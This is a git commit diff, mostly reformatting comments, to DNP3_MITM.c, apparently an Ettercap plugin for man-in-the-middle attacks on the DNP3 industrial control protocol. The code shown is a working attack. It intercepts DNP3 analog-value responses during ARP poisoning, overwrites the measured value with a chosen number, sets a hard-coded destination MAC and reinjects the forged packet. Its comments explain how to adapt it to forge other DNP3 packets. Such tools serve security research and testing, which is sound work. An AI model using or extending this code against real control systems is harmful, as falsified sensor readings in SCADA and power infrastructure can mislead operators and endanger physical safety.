2340375a45db714d09120af54e2769ace8513bec
filipepestana <filipe.pestana9@gmail.com>
2019-01-03 12:13:02 +0000

    Added comments

--- DNP3_MITM.c
+++ DNP3_MITM.c
@@ -36,18 +36,18 @@
 u_char START1 = 0x05;
 u_char START2 = 0x64;
 
-/*	In this example we are only interested in modifying response packets with the hexadecimal type 81.
-	Specifically 81 packets with length 26 that are responses with analog values. (There are other 81 packets)
-	To modify other DNP3 packets, these values must be edited.
+/* In this example we are only interested in modifying response packets with the hexadecimal type 81.
+   Specifically 81 packets with length 26 that are responses with analog values. (There are other 81 packets)
+   To modify other DNP3 packets, these values must be edited.
 */
 u_char response = 0x81;
 u_int8 aux = 26;
 
-/*	This structure also corresponds to response packets with the hexadecimal type 81.
-	To modify other DNP3 packets, the Application Layer of the structure should be edited following
-	the data stream of the packet on a packet analyzer (ex: Wireshark)
+/* This structure also corresponds to response packets with the hexadecimal type 81.
+   To modify other DNP3 packets, the Application Layer of the structure should be edited following
+   the data stream of the packet on a packet analyzer (ex: Wireshark)
 	
-	Unlike the IEC 104 MITM file, this struct wasnt seperated due to the protocol having large data chunks (16+ bits)
+   Unlike the IEC 104 MITM file, this struct wasnt seperated due to the protocol having large data chunks (16+ bits)
 */
 struct dnp_data {
   //Data Link Layer - Header Block
@@ -74,8 +74,8 @@ struct dnp_data {
   //Application Layer
   //Application Header
   u_char app_seq : 4;	//Sequence
-  u_char uns : 1;		//Unsolicited
-  u_char con : 1;		//Confirm
+  u_char uns : 1;	//Unsolicited
+  u_char con : 1;	//Confirm
   u_char app_fin : 1;	//Final
   u_char app_fir : 1;	//First
   
@@ -83,30 +83,30 @@ struct dnp_data {
   u_char func_code;
   
   //Internal Indications
-  u_char bmr : 1;		//Broadcast Msg Rx
-  u_char c1 : 1;		//Class 1 Data Available
-  u_char c2 : 1;		//Class 2 Data Available
-  u_char c3 : 1;		//Class 3 Data Available
-  u_char tsr : 1;		//Time Sync Required
-  u_char dol : 1;		//Digital Outputs in Local
-  u_char dev_t : 1;		//Device Trouble
-  u_char dev_r : 1;		//Device Restart
+  u_char bmr : 1;	//Broadcast Msg Rx
+  u_char c1 : 1;	//Class 1 Data Available
+  u_char c2 : 1;	//Class 2 Data Available
+  u_char c3 : 1;	//Class 3 Data Available
+  u_char tsr : 1;	//Time Sync Required
+  u_char dol : 1;	//Digital Outputs in Local
+  u_char dev_t : 1;	//Device Trouble
+  u_char dev_r : 1;	//Device Restart
  
-  u_char fcni : 1;		//Function Code not implemented
-  u_char rou : 1;		//Requested Objects Unknown
-  u_char pi : 1;		//Parameters Invalid or Out of Range
-  u_char ebo : 1;		//Event Buffer Overflow
-  u_char oae : 1;		//Operation Already Executing
-  u_char cc : 1;		//Configuration Corrupt
+  u_char fcni : 1;	//Function Code not implemented
+  u_char rou : 1;	//Requested Objects Unknown
+  u_char pi : 1;	//Parameters Invalid or Out of Range
+  u_char ebo : 1;	//Event Buffer Overflow
+  u_char oae : 1;	//Operation Already Executing
+  u_char cc : 1;	//Configuration Corrupt
   u_char blank : 2;
   
   //Object 1 Header
   //Object 1 Type
-  u_int obj : 8;		//Object 1 Group
-  u_int var : 8;		//Object 1 Variation
+  u_int obj : 8;	//Object 1 Group
+  u_int var : 8;	//Object 1 Variation
    
   //Qualifier Field
-  u_char range : 4;		//Range Code - 8-bit Start and Stop Indices
+  u_char range : 4;	//Range Code - 8-bit Start and Stop Indices
   u_char prefix : 3;	//Prefix Code
   
   u_char blank1 : 1;
@@ -118,19 +118,19 @@ struct dnp_data {
   //Point Number
   //Quality
   u_char online : 1;	//Online
-  u_char reset : 1;		//Restart
-  u_char com_f : 1;		//Comm Fail
-  u_char rf : 1;		//Remote Force
-  u_char lf : 1;		//Local Force
-  u_char cf : 1;		//Chatter Filter
+  u_char reset : 1;	//Restart
+  u_char com_f : 1;	//Comm Fail
+  u_char rf : 1;	//Remote Force
+  u_char lf : 1;	//Local Force
+  u_char cf : 1;	//Chatter Filter
   u_char reserv : 1;	//Reserved
   u_char p_value : 1;	//Point Value
    
   
   //Object 2 Header
   //Object 2 Type
-  u_int obj2 : 8;		//Object 2 Group
-  u_int var2 : 8;		//Object 2 Variation
+  u_int obj2 : 8;	//Object 2 Group
+  u_int var2 : 8;	//Object 2 Variation
   
   //Qualifier Field
   u_char range2 : 4;	//Range Code - 8-bit Start and Stop Indices
@@ -142,25 +142,25 @@ struct dnp_data {
   u_char start8_2 : 8;
   u_char stop8_2 : 8;
   
-  u_int crc1 : 16;		//Checksum Data Chunk 0
+  u_int crc1 : 16;	//Checksum Data Chunk 0
   
   //Quality
   u_char online2 : 1;	//Online
   u_char reset2 : 1;	//Restart
   u_char com_f2 : 1;	//Comm Fail
-  u_char rf2 : 1;		//Remote Force
-  u_char lf2 : 1;		//Local Force
-  u_char or : 1;		//Over-Range 
-  u_char rc : 1;		//Reference Check
+  u_char rf2 : 1;	//Remote Force
+  u_char lf2 : 1;	//Local Force
+  u_char or : 1;	//Over-Range 
+  u_char rc : 1;	//Reference Check
   u_char reserv2 : 1;	//Reserved
   
   //Value 32 bits
-  u_int val4 : 8;		// All 32 bits of the value are separated in 8bit increments
-  u_int val3 : 8;		// Full value is: val1 val2 val3 val4, where val1 contains the MSBs and val4 the LSBs
-  u_int val2 : 8;		// To edit this value, the decimal number should be converted to hexadecimal and edited accordingly
-  u_int val1 : 8;		// Ex: 30 would be 00 00 00 1e or 0000 0000  0000 0000  0000 0000  0001 1110
+  u_int val4 : 8;	// All 32 bits of the value are separated in 8bit increments
+  u_int val3 : 8;	// Full value is: val1 val2 val3 val4, where val1 contains the MSBs and val4 the LSBs
+  u_int val2 : 8;	// To edit this value, the decimal number should be converted to hexadecimal and edited accordingly
+  u_int val1 : 8;	// Ex: 30 would be 00 00 00 1e or 0000 0000  0000 0000  0000 0000  0001 1110
   
-  u_int crc2 : 16;		//Checksum Data Chunk 1
+  u_int crc2 : 16;	//Checksum Data Chunk 1
 };
 
 
@@ -264,21 +264,21 @@ static void parse_tcp(struct packet_object *po)
   struct dnp_data *dd;
   dd = (struct dnp_data *)po->DATA.data;
 	
-  /*	We are interested in monitoring DNP3 packets of type Response 0x81 and length 26.
-		This can also be used to filter packets with more precision, such as packets with certain dst or src ips 
+  /* We are interested in monitoring DNP3 packets of type Response 0x81 and length 26.
+     This can also be used to filter packets with more precision, such as packets with certain dst or src ips 
   */
   if(START1 == dd->start1 && START2 == dd->start2 && response == dd->func_code && aux == dd->length) {
 
-	/* Debug message for original packet */
+    /* Debug message for original packet */
     USER_MSG("=========================");
     USER_MSG("\nOriginal Packet\n");
 	print_dnp(dd);
     USER_MSG("=========================\n");
     
     /* We can't inject in unoffensive mode or in bridge mode or while the read flag (prevents the LAN from being 
-	   scanned) is active. 
-	*/
-	//Debug
+       scanned) is active. 
+    */
+    //Debug
     //USER_MSG("unoffensive:%d\n read:%d\n iface_bridge:%d\n", EC_GBL_OPTIONS->unoffensive, EC_GBL_OPTIONS->read, EC_GBL_OPTIONS->iface_bridge);
     if (EC_GBL_OPTIONS->unoffensive || EC_GBL_OPTIONS->read || (EC_GBL_OPTIONS->iface_bridge && EC_GBL_OPTIONS->iface_bridge<1000 && EC_GBL_OPTIONS->iface_bridge>0)) {
       USER_MSG("\n[!!] We can't inject in unoffensive mode or in bridge mode.\n");
@@ -291,23 +291,23 @@ static void parse_tcp(struct packet_object *po)
 	
     /* Modify intended value */
     u_long value = 40;			 //To modify the value field (32bit analog)
-	dd->val4 = (value & 0xff);	
-	dd->val3 = ((value >> 8) & 0xff);		
-	dd->val2 = ((value >> 16) & 0xff);		
-	dd->val1 = (value >> 24);
+    dd->val4 = (value & 0xff);	
+    dd->val3 = ((value >> 8) & 0xff);		
+    dd->val2 = ((value >> 16) & 0xff);		
+    dd->val1 = (value >> 24);
 	
-	/*	UDP requires destination mac address. As we are ARP poisoning, the original mac address must be copied
-	from a packet dissector to the packet destination.
-	[!]Comment lines for TCP
-	*/
-	po->L2.dst[0] = 0x94;
-	po->L2.dst[1] = 0xde;
-	po->L2.dst[2] = 0x80;
-	po->L2.dst[3] = 0x29;
-	po->L2.dst[4] = 0x7a;
-	po->L2.dst[5] = 0x0d;
+    /* UDP requires destination mac address. As we are ARP poisoning, the original mac address must be copied
+       from a packet dissector to the packet destination.
+       [!]Comment lines for TCP
+    */
+    po->L2.dst[0] = 0x94;
+    po->L2.dst[1] = 0xde;
+    po->L2.dst[2] = 0x80;
+    po->L2.dst[3] = 0x29;
+    po->L2.dst[4] = 0x7a;
+    po->L2.dst[5] = 0x0d;
 	
-	/* Copy information to original structure */
+    /* Copy information to original structure */
     memcpy(po->DATA.data, dd, sizeof(dd));
 
     /* Debug message for altered packet */
@@ -317,26 +317,26 @@ static void parse_tcp(struct packet_object *po)
     USER_MSG("=========================\n");
 
     /* Send modified packet (UDP)*/
-		//Send function args
-		//int 	send_udp (struct ip_addr *sip, struct ip_addr *tip, u_int8 *tmac, u_int16 sport, u_int16 dport, u_int8 *payload, size_t length)
-		//DEBUG message
-	//USER_MSG("po->L2.flags:%x, po->L2.flags:%x,po->L4.src:%x, po->L4.dst:%x\n", po->L2.dst[0], po->L2.dst[1], po->L4.src, po->L4.dst);
-		//Send function
-	send_udp(&po->L3.src, &po->L3.dst, po->L2.dst, po->L4.src, po->L4.dst, po->DATA.data, po->DATA.disp_len);
+	//Send function args
+	//int 	send_udp (struct ip_addr *sip, struct ip_addr *tip, u_int8 *tmac, u_int16 sport, u_int16 dport, u_int8 *payload, size_t length)
+	//DEBUG message
+    //USER_MSG("po->L2.flags:%x, po->L2.flags:%x,po->L4.src:%x, po->L4.dst:%x\n", po->L2.dst[0], po->L2.dst[1], po->L4.src, po->L4.dst);
+	//Send function
+    send_udp(&po->L3.src, &po->L3.dst, po->L2.dst, po->L4.src, po->L4.dst, po->DATA.data, po->DATA.disp_len);
 	
-	/* Send modified packet (TCP)*/
-		//Send funtion args
-		//int 	send_tcp (struct ip_addr *sip, struct ip_addr *tip, u_int16 sport, u_int16 dport, u_int32 seq, u_int32 ack, u_int8 flags, u_int8 *payload, size_t length)
-		//DEBUG message
+    /* Send modified packet (TCP)*/
+	//Send funtion args
+	//int 	send_tcp (struct ip_addr *sip, struct ip_addr *tip, u_int16 sport, u_int16 dport, u_int32 seq, u_int32 ack, u_int8 flags, u_int8 *payload, size_t length)
+	//DEBUG message
     //USER_MSG("po->L4.seq:%lu ,po->L4.ack: %lu, TH_ACK: %d, po->DATA.disp_len: %d\n",po->L4.seq, po->L4.ack, TH_PSH|TH_ACK, po->DATA.disp_len );
-		//Send function
-	//send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_PSH|TH_ACK, po->DATA.data, po->DATA.disp_len);
+	//Send function
+    //send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, TH_PSH|TH_ACK, po->DATA.data, po->DATA.disp_len);
   
-	/*	The packet object struct has 4 layers, but only 3 of them are relevant in this case:
-		L2 - Eth;
-		L3 - IP;
-		L4 - TCP/UDP (It detects the protocol automatically).	
-	*/
+    /*	The packet object struct has 4 layers, but only 3 of them are relevant in this case:
+	L2 - Eth;
+	L3 - IP;
+	L4 - TCP/UDP (It detects the protocol automatically).	
+    */
   
   
   }
